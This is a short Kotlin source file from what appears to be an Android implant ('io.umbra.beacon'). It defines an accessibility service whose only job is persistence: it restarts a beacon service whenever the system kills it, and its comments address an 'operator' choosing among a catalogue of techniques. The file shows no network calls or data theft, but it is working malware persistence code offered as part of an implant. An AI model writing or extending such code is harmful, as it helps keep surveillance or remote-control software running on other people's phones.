package io.umbra.beacon

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent

/**
 * The accessibility service of the implant.
 *
 * Android keeps an enabled accessibility service alive: it is the way the
 * platform offers to an application that must never be killed.  It is also
 * the most visible technique of the catalogue -- the user sees it in the
 * settings of Android, with the name of the application, and Android shows
 * a notification while it runs.
 *
 * The operator has to know that: the implant says in its report that this
 * technique is visible to the user of the phone.  The service itself is
 * quiet: it watches the windows that change and starts the beacon when the
 * system has killed it.
 */
class UmbraAccessibilityService : AccessibilityService() {
    override fun onServiceConnected() {
        super.onServiceConnected()
        BeaconService.start(this)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        // The event itself is not the point of the technique: the service
        // existing, and being alive, is.
    }

    override fun onInterrupt() {
        // Nothing to interrupt.
    }

    companion object {
        /** The component the operator enables in the settings. */
        const val COMPONENT = "io.umbra.beacon/.UmbraAccessibilityService"
    }
}
